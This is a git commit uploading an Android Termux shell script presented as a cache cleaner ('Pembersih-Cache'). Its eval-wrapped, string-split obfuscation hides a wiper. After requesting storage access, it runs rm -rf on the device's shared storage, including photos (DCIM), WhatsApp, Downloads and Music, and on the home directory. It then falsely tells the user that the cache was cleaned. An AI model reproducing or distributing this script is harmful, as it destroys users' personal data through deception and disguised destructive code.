b7aa96b81c43a5c4a2cde783e3c8c845c6a4b6c9
Reyhan Dwi <66651244+Mr-dobi@users.noreply.github.com>
2020-08-16 19:57:50 +0700

    Add files via upload

---
+++ Pembersih-Cache.sh
@@ -0,0 +1,9 @@
+# hay kang recode jangan direcode ya please
+# Compile By Mr.Reyhan
+# Team     : Cyber Termux
+# Facebook : Mas.Reyhan8
+
+
+z="
+";HBz='tsAp';WBz='ta c';sz='rf $';Jz='1b[1';EBz='hats';VBz='n da';Az='slee';Bz='p 3';Oz=' seb';Rz='.\x1';DBz='/0/W';rz='a';Uz='term';SBz=' mem';YBz=' and';kz='/0/a';cBz='m"';Fz=' -e ';Sz='b[0m';Zz='rm -';Wz='etup';LBz='/0/M';Hz='b[10';gz='sdca';iz='/0/D';mz='id/o';ZBz='a !.';tz='HOME';BBz='ted/';XBz='ache';pz='roid';GBz='/Wha';KBz='oads';RBz='asil';Cz='clea';IBz='p';vz='dcar';MBz='usic';OBz='ic';hz='rd/0';JBz='ownl';Kz=';32m';cz='age/';fz='/0';Qz='r...';Dz='r';Ez='echo';bz='stor';NBz='/Mus';PBz='p 4';ez='ated';Nz='nggu';QBz='Berh';Gz='"\x1';jz='CIM';lz='ndro';Vz='ux-s';FBz='App';nz='bb';oz='/and';CBz='0';bBz='1b[0';Pz='enta';Lz='Moho';Iz='5m\x';Yz='rage';az='rf /';yz='ge/e';wz='d/0';qz='/dat';uz='rf s';Mz='n tu';UBz='ihka';dz='emul';xz='tora';Xz='-sto';Tz='"';aBz='..\x';TBz='bers';ABz='mula';
+eval "$Az$Bz$z$Cz$Dz$z$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$z$Uz$Vz$Wz$Xz$Yz$z$Zz$az$bz$cz$dz$ez$fz$z$Zz$az$gz$hz$z$Zz$az$bz$cz$dz$ez$iz$jz$z$Zz$az$bz$cz$dz$ez$kz$lz$mz$nz$z$Zz$az$gz$hz$oz$pz$qz$rz$z$Zz$sz$tz$z$Zz$uz$vz$wz$z$Zz$uz$xz$yz$ABz$BBz$CBz$z$Zz$az$bz$cz$dz$ez$DBz$EBz$FBz$z$Zz$az$gz$hz$GBz$HBz$IBz$z$Zz$az$bz$cz$dz$ez$iz$JBz$KBz$z$Zz$az$bz$cz$dz$ez$LBz$MBz$z$Zz$az$gz$hz$NBz$OBz$z$Az$PBz$z$Ez$Fz$Gz$Hz$Iz$Jz$Kz$QBz$RBz$SBz$TBz$UBz$VBz$WBz$XBz$YBz$ZBz$aBz$bBz$cBz"
